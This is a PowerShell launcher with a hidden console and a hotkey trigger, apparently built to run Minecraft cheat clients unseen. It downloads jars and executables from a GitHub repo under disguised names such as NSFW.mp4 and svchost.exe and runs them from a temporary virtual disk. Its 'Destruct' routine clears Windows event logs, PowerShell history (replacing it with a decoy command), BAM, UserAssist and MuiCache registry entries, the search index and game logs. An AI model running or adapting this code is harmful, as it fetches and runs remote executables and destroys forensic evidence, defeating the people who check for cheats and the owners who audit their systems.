Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Enhanced stealth setup
Set-PSReadlineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue
Clear-Content -Path "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -ErrorAction SilentlyContinue

# START OF KEY BUTTON DETECTION
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class User32 {
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
}
"@

Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
"@

# Hide console window with error handling
try {
    $consolePtr = [Win32]::GetConsoleWindow()
    if ($consolePtr -ne [IntPtr]::Zero) {
        [Win32]::ShowWindow($consolePtr, 0) | Out-Null
    }
} catch {
    # Silently continue if console hiding fails
}

# Virtual key codes
$VK_CONTROL = 0x11
$VK_MENU = 0x12  # Alt key
$VK_F11 = 0x7A

# Wait for hotkey activation
while ($true) {
    try {
        $ctrlPressed = [User32]::GetAsyncKeyState($VK_CONTROL) -band 0x8000
        $altPressed = [User32]::GetAsyncKeyState($VK_MENU) -band 0x8000
        $f11Pressed = [User32]::GetAsyncKeyState($VK_F11) -band 0x8000
        
        if ($ctrlPressed -and $altPressed -and $f11Pressed) {
            break
        }
        Start-Sleep -Milliseconds 100
    } catch {
        Start-Sleep -Milliseconds 500
    }
}

# Set preferences to run silently
$ConfirmPreference = 'None'
$ErrorActionPreference = 'SilentlyContinue'
$WarningPreference = 'SilentlyContinue'
$VerbosePreference = 'SilentlyContinue'

# FILELESS VHD CREATION
$vdiskSizeMB = 2048
$randomName = [System.IO.Path]::GetRandomFileName().Replace('.', '')
$vdiskPath = "$env:TEMP\$randomName.vhd"

# Create VHD using in-memory diskpart script
$createScript = @"
create vdisk file="$vdiskPath" maximum=$vdiskSizeMB type=expandable
select vdisk file="$vdiskPath"
attach vdisk
"@

# Execute diskpart with in-memory script (no temp files)
try {
    $createScript | diskpart.exe 2>$null | Out-Null
} catch {
    exit 1
}

# Quick disk detection and setup
Start-Sleep -Seconds 1

$timeout = 0
$disk = $null
while ($timeout -lt 8) {
    try {
        $disk = Get-Disk | Where-Object { $_.Location -like "*$vdiskPath*" } | Select-Object -First 1
        if ($disk) { break }
    } catch { }
    Start-Sleep -Milliseconds 500
    $timeout++
}

if ($disk) {
    try {
        if ($disk.IsOffline -eq $true) {
            Set-Disk -Number $disk.Number -IsOffline $false -ErrorAction SilentlyContinue
            Start-Sleep -Milliseconds 500
        }
        
        if ($disk.PartitionStyle -eq 'Raw') {
            Initialize-Disk -Number $disk.Number -PartitionStyle MBR -ErrorAction SilentlyContinue
            Start-Sleep -Milliseconds 500
        }
        
        $partition = New-Partition -DiskNumber $disk.Number -UseMaximumSize -DriveLetter Z -ErrorAction SilentlyContinue
        Start-Sleep -Milliseconds 500
        
        Format-Volume -DriveLetter Z -FileSystem FAT32 -NewFileSystemLabel "Local Disk" -Confirm:$false -ErrorAction SilentlyContinue
        Start-Sleep -Milliseconds 800
        
    } catch {
        # Continue even if disk setup partially fails
    }
}

# Download sound file directly to memory drive
$soundFilePath = "Z:\na.wav"
function Download-SoundFile {
    $soundUrl = "https://github.com/devnull-sys/devnull/raw/refs/heads/main/na.wav"
    $maxRetries = 2
    $retryCount = 0
    
    while ($retryCount -lt $maxRetries) {
        try {
            if (Test-Path "Z:\") {
                Invoke-WebRequest -Uri $soundUrl -OutFile $soundFilePath -TimeoutSec 8 -ErrorAction Stop
                if ((Test-Path $soundFilePath) -and ((Get-Item $soundFilePath).Length -gt 0)) {
                    return $true
                }
            }
        } catch { }
        $retryCount++
        if ($retryCount -lt $maxRetries) {
            Start-Sleep -Milliseconds 800
        }
    }
    return $false
}

# Quick wait for Z: drive to be ready
$driveReady = $false
for ($i = 0; $i -lt 6; $i++) {
    if (Test-Path "Z:\") {
        $driveReady = $true
        break
    }
    Start-Sleep -Milliseconds 500
}

if ($driveReady) {
    Download-SoundFile
}

# Basic trace clearing function (minimal)
function Clear-BasicTraces {
    try { 
        # Clear temp VHD file
        if (Test-Path $vdiskPath) {
            Remove-Item -Path $vdiskPath -Force -ErrorAction SilentlyContinue
        }
        
    } catch { }
}

# Enhanced trace clearing function (comprehensive at end)
function Clear-AllTraces {
    try {
        # Clear PowerShell history
        Clear-Content -Path "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -ErrorAction SilentlyContinue
        Set-Content -Path "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Value 'iwr -useb https://raw.githubusercontent.com/spicetify/cli/main/install.ps1 | iex' -ErrorAction SilentlyContinue
        
        # Clear jump lists (but not Recent folder)
        $jumpListPath = "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations"
        Get-ChildItem -Path $jumpListPath -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
        
        $customJumpListPath = "$env:APPDATA\Microsoft\Windows\Recent\CustomDestinations"
        Get-ChildItem -Path $customJumpListPath -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
        
        # Registry cleanup - MuiCache
        $muiCachePath = "HKCU:\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache"
        if (Test-Path $muiCachePath) {
            Get-ItemProperty $muiCachePath -ErrorAction SilentlyContinue | 
            ForEach-Object { $_.PSObject.Properties } | 
            Where-Object { $_.Name -like "Z:\*" -or $_.Name -like "*java*" -or $_.Name -like "*diskpart*" } | 
            ForEach-Object { Remove-ItemProperty -Path $muiCachePath -Name $_.Name -ErrorAction SilentlyContinue }
        }
        
        # BAM/DAM Registry cleanup
        $bamPaths = @(
            "HKLM:\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings",
            "HKLM:\SYSTEM\CurrentControlSet\Services\dam\State\UserSettings"
        )
        foreach ($bamPath in $bamPaths) {
            if (Test-Path $bamPath) {
                Get-ChildItem -Path $bamPath -ErrorAction SilentlyContinue | ForEach-Object {
                    $userPath = $_.PSPath
                    Get-ItemProperty $userPath -ErrorAction SilentlyContinue | 
                    ForEach-Object { $_.PSObject.Properties } | 
                    Where-Object { $_.Name -match "java\.exe|diskpart\.exe|mmc\.exe|powershell\.exe" } | 
                    ForEach-Object { Remove-ItemProperty -Path $userPath -Name $_.Name -ErrorAction SilentlyContinue }
                }
            }
        }
        
        # Clear UserAssist
        $userAssistPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\UserAssist"
        if (Test-Path $userAssistPath) {
            Get-ChildItem -Path $userAssistPath -Recurse -ErrorAction SilentlyContinue | 
            Where-Object { $_.Name -like "*Count*" } | ForEach-Object {
                Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue | 
                ForEach-Object { $_.PSObject.Properties } | 
                Where-Object { $_.Name -like "*java*" -or $_.Name -like "*diskpart*" } | 
                ForEach-Object { Remove-ItemProperty -Path $_.PSPath -Name $_.Name -ErrorAction SilentlyContinue }
            }
        }
        
        # Clear Windows Search Database
        Stop-Service -Name "WSearch" -Force -ErrorAction SilentlyContinue
        Remove-Item -Path "C:\ProgramData\Microsoft\Search\Data\Applications\Windows\Windows.edb" -Force -ErrorAction SilentlyContinue
        Start-Service -Name "WSearch" -ErrorAction SilentlyContinue
        
        # Clear thumbnail cache
        $thumbcachePaths = @(
            "$env:LOCALAPPDATA\Microsoft\Windows\Explorer\thumbcache_*.db",
            "$env:LOCALAPPDATA\Microsoft\Windows\Explorer\iconcache_*.db"
        )
        foreach ($path in $thumbcachePaths) {
            Get-ChildItem -Path $path -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
        }
        
        # Clear Event logs
        $eventLogs = @("System", "Application", "Security", "Windows PowerShell")
        foreach ($log in $eventLogs) {
            Clear-EventLog -LogName $log -ErrorAction SilentlyContinue
        }
        wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
        wevtutil cl "Microsoft-Windows-Kernel-Process/Analytic" 2>$null
        
        # Clear JVM logs
        $jvmLogPaths = @(
            "$env:USERPROFILE\.java\deployment\log\*.log",
            "$env:USERPROFILE\AppData\LocalLow\Sun\Java\Deployment\log\*.log",
            "$env:USERPROFILE\AppData\Roaming\.minecraft\logs\*.log",
            "$env:USERPROFILE\AppData\Roaming\.minecraft\feather\logs\*.log",
            "$env:TEMP\hs_err_pid*.log"
        )
        foreach ($path in $jvmLogPaths) {
            Get-ChildItem -Path $path -ErrorAction SilentlyContinue | ForEach-Object {
                Clear-Content -Path $_.FullName -ErrorAction SilentlyContinue
            }
        }
        
        # Clear our VHD file
        if (Test-Path $vdiskPath) {
            Remove-Item -Path $vdiskPath -Force -ErrorAction SilentlyContinue
        }
        
        # Clear temp files
        Remove-Item -Path "$env:TEMP\*.vhd" -Force -ErrorAction SilentlyContinue
        
    } catch { }
}

# Create the main form
$form = New-Object System.Windows.Forms.Form
$form.Text = 'By Zpat - FAX'
$form.Size = New-Object System.Drawing.Size(942, 443)
$form.StartPosition = 'CenterScreen'
$form.BackColor = 'Black'
$form.FormBorderStyle = 'FixedDialog'
$form.MaximizeBox = $false
$form.MinimizeBox = $false
$form.ForeColor = 'White'

# ASCII Art Label
$asciiArt = @"
██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗███╗   ███╗██████╗  ██████╗ ██╗    ██╗███╗   ██╗
██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝████╗ ████║██╔══██╗██╔═══██╗██║    ██║████╗  ██║
███████║███████║██║     █████╔╝ █████╗  ██╔████╔██║██║  ██║██║   ██║██║ █╗ ██║██╔██╗ ██║
██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██║╚██╔╝██║██║  ██║██║   ██║██║███╗██║██║╚██╗██║
██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║ ╚═╝ ██║██████╔╝╚██████╔╝╚███╔███╔╝██║ ╚████║
╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝╚═════╝  ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝
"@

$label = New-Object System.Windows.Forms.Label
$label.Text = $asciiArt
$label.Font = New-Object System.Drawing.Font('Courier New', 9)
$label.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")
$label.AutoSize = $true
$label.Location = New-Object System.Drawing.Point(184, 87)
$form.Controls.Add($label)

# Define Main Menu Buttons
$injectButton = New-Object System.Windows.Forms.Button
$injectButton.Text = 'Inject'
$injectButton.Width = 100
$injectButton.Height = 40
$injectButton.Location = New-Object System.Drawing.Point(196, 235)
$injectButton.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#29903b")
$injectButton.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")
$injectButton.Font = New-Object System.Drawing.Font('Arial', 10, [System.Drawing.FontStyle]::Bold)

$destructButton = New-Object System.Windows.Forms.Button
$destructButton.Text = 'Destruct'
$destructButton.Width = 100
$destructButton.Height = 40
$destructButton.Location = New-Object System.Drawing.Point(730, 235)
$destructButton.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#a60e0e")
$destructButton.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")
$destructButton.Font = New-Object System.Drawing.Font('Arial', 10, [System.Drawing.FontStyle]::Bold)

# Function to return to main menu
function Show-MainMenu {
    $form.Controls.Clear()
    $form.Controls.Add($label)
    $form.Controls.Add($injectButton)
    $form.Controls.Add($destructButton)
}

# Inject Button Click Handler
$injectButton.Add_Click({
    # Disable form during sound playback
    $form.Enabled = $false
    
    # Play sound if available
    if (Test-Path $soundFilePath) {
        try {
            $player = New-Object System.Media.SoundPlayer
            $player.SoundLocation = $soundFilePath
            $player.PlaySync()
        } catch { }
    }
    
    $form.Enabled = $true
    $form.Controls.Clear()
    $form.Controls.Add($label)
    
    # Back Button
    $backButton = New-Object System.Windows.Forms.Button
    $backButton.Text = 'Back'
    $backButton.Width = 100
    $backButton.Height = 40
    $backButton.Location = New-Object System.Drawing.Point(730, 336)
    $backButton.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#a60e0e")
    $backButton.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")
    $backButton.Font = New-Object System.Drawing.Font('Arial', 10, [System.Drawing.FontStyle]::Bold)
    $backButton.Add_Click({ Show-MainMenu })
    
    # Prestige Button
    $prestigeButton = New-Object System.Windows.Forms.Button
    $prestigeButton.Text = 'Prestige'
    $prestigeButton.Width = 120
    $prestigeButton.Height = 40
    $prestigeButton.Location = New-Object System.Drawing.Point(196, 235)
    $prestigeButton.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#a167ff")
    $prestigeButton.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")
    $prestigeButton.Font = New-Object System.Drawing.Font('Arial', 10, [System.Drawing.FontStyle]::Bold)
    $prestigeButton.Add_Click({
        try {
            if (-Not (Test-Path "Z:\NSFW.mp4")) {
                # Quick download with single retry
                for ($i = 0; $i -lt 2; $i++) {
                    try {
                        Invoke-WebRequest "https://github.com/devnull-sys/devnull/raw/refs/heads/main/devnull/sodium/sodium-mc1.21.4.jar" -OutFile "Z:\NSFW.mp4" -TimeoutSec 12 -ErrorAction Stop
                        if ((Test-Path "Z:\NSFW.mp4") -and ((Get-Item "Z:\NSFW.mp4").Length -gt 0)) {
                            break
                        }
                    } catch { }
                    if ($i -eq 0) { Start-Sleep -Milliseconds 1000 }
                }
            }
            if ((Test-Path "Z:\NSFW.mp4") -and (Get-Command java -ErrorAction SilentlyContinue)) {
                Start-Process java -ArgumentList '-jar "Z:\NSFW.mp4"' -ErrorAction SilentlyContinue
            }
        } catch { }
    })
    
    # DoomsDay Button
    $doomsdayButton = New-Object System.Windows.Forms.Button
    $doomsdayButton.Text = 'DoomsDay'
    $doomsdayButton.Width = 120
    $doomsdayButton.Height = 40
    $doomsdayButton.Location = New-Object System.Drawing.Point(326, 235)
    $doomsdayButton.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#2563eb")
    $doomsdayButton.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")
    $doomsdayButton.Font = New-Object System.Drawing.Font('Arial', 10, [System.Drawing.FontStyle]::Bold)
    $doomsdayButton.Add_Click({
        try {
            if (-Not (Test-Path "Z:\cat.mp4")) {
                # Quick download with single retry
                for ($i = 0; $i -lt 2; $i++) {
                    try {
                        Invoke-WebRequest "https://github.com/devnull-sys/devnull/raw/refs/heads/main/devnull/sodium/sodium-extra-mc1.21.4.jar" -OutFile "Z:\cat.mp4" -TimeoutSec 12 -ErrorAction Stop
                        if ((Test-Path "Z:\cat.mp4") -and ((Get-Item "Z:\cat.mp4").Length -gt 0)) {
                            break
                        }
                    } catch { }
                    if ($i -eq 0) { Start-Sleep -Milliseconds 1000 }
                }
            }
            if ((Test-Path "Z:\cat.mp4") -and (Get-Command java -ErrorAction SilentlyContinue)) {
                Start-Process java -ArgumentList '-jar "Z:\cat.mp4"' -ErrorAction SilentlyContinue
            }
        } catch { }
    })
    
    # VapeV4 Button
    $vapev4Button = New-Object System.Windows.Forms.Button
    $vapev4Button.Text = 'VapeV4'
    $vapev4Button.Width = 120
    $vapev4Button.Height = 40
    $vapev4Button.Location = New-Object System.Drawing.Point(456, 235)
    $vapev4Button.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#006466")
    $vapev4Button.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")
    $vapev4Button.Font = New-Object System.Drawing.Font('Arial', 10, [System.Drawing.FontStyle]::Bold)
    $vapev4Button.Add_Click({
        try {
            if (-Not (Test-Path "Z:\gentask.exe")) {
                # Quick download with single retry
                for ($i = 0; $i -lt 2; $i++) {
                    try {
                        Invoke-WebRequest "https://github.com/devnull-sys/devnull/raw/refs/heads/main/devnull/ProgramData/svchost.exe" -OutFile "Z:\gentask.exe" -TimeoutSec 12 -ErrorAction Stop
                        if ((Test-Path "Z:\gentask.exe") -and ((Get-Item "Z:\gentask.exe").Length -gt 0)) {
                            break
                        }
                    } catch { }
                    if ($i -eq 0) { Start-Sleep -Milliseconds 1000 }
                }
            }
            if (Test-Path "Z:\gentask.exe") {
                Start-Process "Z:\gentask.exe" -ErrorAction SilentlyContinue
            }
        } catch { }
    })
    
    # VapeLite Button
    $vapeliteButton = New-Object System.Windows.Forms.Button
    $vapeliteButton.Text = 'VapeLite'
    $vapeliteButton.Width = 120
    $vapeliteButton.Height = 40
    $vapeliteButton.Location = New-Object System.Drawing.Point(586, 235)
    $vapeliteButton.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#00f1e1")
    $vapeliteButton.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#171317")
    $vapeliteButton.Font = New-Object System.Drawing.Font('Arial', 10, [System.Drawing.FontStyle]::Bold)
    $vapeliteButton.Add_Click({
        try {
            if (-Not (Test-Path "Z:\ilasm.exe")) {
                # Quick download with single retry
                for ($i = 0; $i -lt 2; $i++) {
                    try {
                        Invoke-WebRequest "https://github.com/devnull-sys/devnull/raw/refs/heads/main/devnull/ProgramData/conhost.exe" -OutFile "Z:\ilasm.exe" -TimeoutSec 12 -ErrorAction Stop
                        if ((Test-Path "Z:\ilasm.exe") -and ((Get-Item "Z:\ilasm.exe").Length -gt 0)) {
                            break
                        }
                    } catch { }
                    if ($i -eq 0) { Start-Sleep -Milliseconds 1000 }
                }
            }
            if (Test-Path "Z:\ilasm.exe") {
                Start-Process "Z:\ilasm.exe" -ErrorAction SilentlyContinue
            }
        } catch { }
    })
    
    # Phantom Button
    $phantomButton = New-Object System.Windows.Forms.Button
    $phantomButton.Text = 'Phantom'
    $phantomButton.Width = 120
    $phantomButton.Height = 40
    $phantomButton.Location = New-Object System.Drawing.Point(716, 235)
    $phantomButton.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#4c0eb7")
    $phantomButton.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")
    $phantomButton.Font = New-Object System.Drawing.Font('Arial', 10, [System.Drawing.FontStyle]::Bold)
    $phantomButton.Add_Click({
        try {
            $clipboardText = "-agentlib:jdwp=transport=dt_socket,server=n,suspend=y,address=phantom.clientlauncher.net:6550"
            Set-Clipboard -Value $clipboardText -ErrorAction SilentlyContinue
        } catch { }
    })
    
    # Add all buttons to form
    $form.Controls.Add($prestigeButton)
    $form.Controls.Add($doomsdayButton)
    $form.Controls.Add($vapev4Button)
    $form.Controls.Add($vapeliteButton)
    $form.Controls.Add($phantomButton)
    $form.Controls.Add($backButton)
})

# Enhanced Destruct Button Click Handler - FILELESS
$destructButton.Add_Click({
    # Immediately close the form to prevent hanging
    $form.Hide()
    [System.Windows.Forms.Application]::DoEvents()
    
    try {
        # Clear basic traces during operation
        Clear-BasicTraces
        
        # Fileless VHD destruction using in-memory diskpart
        $disk = $null
        $timeout = 0
        while ($timeout -lt 6) {
            try {
                $disk = Get-Disk | Where-Object { $_.Location -like "*$vdiskPath*" } | Select-Object -First 1
                if ($disk) { break }
            } catch { }
            Start-Sleep -Milliseconds 500
            $timeout++
        }
        
        if ($disk) {
            # Detach VHD using in-memory script
            $detachScript = @"
select vdisk file="$vdiskPath"
detach vdisk
"@
            $detachScript | diskpart.exe 2>$null | Out-Null
        }
        
        # Wait for detachment
        Start-Sleep -Milliseconds 800
        
        # Remove the VHD file from temp
        if (Test-Path $vdiskPath) {
            Remove-Item -Path $vdiskPath -Force -ErrorAction SilentlyContinue
        }
        
        # Final registry cleanup
        Remove-ItemProperty -Path "HKLM:\SYSTEM\MountedDevices" -Name "\DosDevices\Z:" -ErrorAction SilentlyContinue
        Remove-Item -Path "Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Search\VolumeInfoCache\Z:" -Recurse -Force -ErrorAction SilentlyContinue
        
        # Final comprehensive trace clearing at the end
        Clear-AllTraces
        
    } catch { } finally {
        # Ensure form is disposed and application exits
        $form.Close()
        $form.Dispose()
        [System.Windows.Forms.Application]::Exit()
        
        # Force exit the PowerShell process
        Stop-Process -Id $PID -Force -ErrorAction SilentlyContinue
        exit 0
    }
})

# Add main buttons to form
$form.Controls.Add($injectButton)
$form.Controls.Add($destructButton)

# Enhanced form closing handler
$form.Add_FormClosing({
    param($sender, $e)
    Clear-BasicTraces
    [System.Windows.Forms.Application]::Exit()
})

# Show the form and run the application
try {
    [System.Windows.Forms.Application]::Run($form)
} catch {
    # Ensure comprehensive cleanup even if form fails
    Clear-AllTraces
    exit 0
}
